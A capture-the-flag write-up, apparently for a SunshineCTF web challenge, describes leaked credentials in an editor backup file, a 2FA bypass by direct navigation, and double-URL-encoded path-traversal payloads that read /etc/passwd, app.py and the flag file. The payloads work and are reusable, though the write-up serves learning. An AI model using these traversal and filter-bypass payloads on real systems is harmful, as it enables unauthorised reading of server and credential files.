## The Challenge Description

```
We recently started a new CMS, we've had issues with random bots scraping our pages but found a solution with robots! Anyways, besides that there are no new bug fixes. Enjoy our product!

Fuzzing is NOT allowed for this challenge, doing so will lead to IP rate limiting!

## Reconnaissance

- Firstly examined `robots.txt`, because the description mentions bots and I quickly made the connection to robots.txt, which revealed:
    
    ```
    Disallow: /.gitignore_test
    Disallow: /login
    Disallow: /admin/dashboard
    Disallow: /2FA
    ```
    
- Going to `/.gitignore_test`:
    
    ```
    # this tells the git CLI to ignore these files so they're not pushed to the repos by mistake.
    # this is because Muhammad noticed there were temporary files being stored on the disk when being edited
    # something about EMACs.
    # From MUHAMMAD: please make sure to name this .gitignore or it will not work !!!!
    # static files are stored in the /static directory.
    /index/static/login.html~
    /index/static/index.html~
    /index/static/error.html~
    ```
    
- Tested the listed paths; only `/index/static/login.html~` returned valuable info - copy of `login.html` with leaked credentials:
    
    ```html
    <input value="admin@lunarfiles.muhammadali" type="text" name="email">
    <input value="jEJ&(32)DMC<!*###" type="text" name="password">
    ```

## Authentication

- Used the leaked credentials to log in, redirecting to `/2FA` for two-factor authentication.
- Navigated directly to `/admin/dashboard`, bypassing 2FA successfully.

## Exploring the Application

- Explored the admin dashboard, focusing on the "Manage Files" section.
- With Burp I found a file download request: `GET /admin/download/secret3.txt`.
- Experimented with the `/admin/download/` endpoint to test for LFI vulnerabilities after i read the secret text files (there was mentioned them having a problem with LFI and hackers constantly downloading /etc/passwd with very important hint - using payloads from bookhacktricks. That made me go there and try every single payload):
    - `/admin/download//secret3.txt` redirected to `http://127.0.0.1:25307/admin/download/secret3.txt`, suggesting input processing after `/admin/download/`.
    - `/admin/download/./secret1.txt` successfully retrieved the file.
    - After trying some bypass payload i got this error which made me realize we have to use a payload that bypasses the special filter that detects the succession of ../../
    
    ```
    <p>You should be redirected automatically to the target URL: <a href="/admin/lunar_files?err_msg=%5B+Succession+of+&#39;../../&#39;+detected,+forbidden+%5D">/admin/lunar_files?err_msg=%5B+Succession+of+&#39;../../&#39;+detected,+forbidden+%5D</a>. If not, click the link.
    ```

## Finally found the working payload that bypasses filters

Raw version: 

```
https://asteroid.sunshinectf.games/admin/download/.././.././.././.././.././.././.././.././.././.././.././.././/etc/passwd
```

Then we use double url encoding to get this abomination of a payload:

```
https://asteroid.sunshinectf.games/admin/download/%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%2fetc%2fpasswd
```

## Locating the Flag

- Searched like a madman for `flag.txt` in common CTF locations without and everything failed.
- Took a step back to think about what the internal service uses and a teammate found the flag here: ('/proc/self/cwd/app.py')
- Successfully downloaded `app.py` with three directory traversals:

    ```
    https://asteroid.sunshinectf.games/admin/download/..%252f.%252f..%252f.%252f..%252fapp.py
    ```

- And that revealed the flag location:
  
    ```python
    with open("./FLAG/flag.txt", "r") as f:
        FLAG = f.read()
    ```
    
- Now that we knew the exact location of the flag it was easy to retrieve it: `./.././.././../FLAG/flag.txt` with double URL encoding:
    
    ```
    https://asteroid.sunshinectf.games/admin/download/%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%2fFLAG%2fflag.txt
    ```

## Solution

- Final payload to retrieve /etc/passwd:
    
    ```
    https://asteroid.sunshinectf.games/admin/download/%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%2fetc%2fpasswd
    ```
    
- Final payload to retrieve the flag:
    
    ```
    https://asteroid.sunshinectf.games/admin/download/%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%2fFLAG%2fflag.txt
    ```
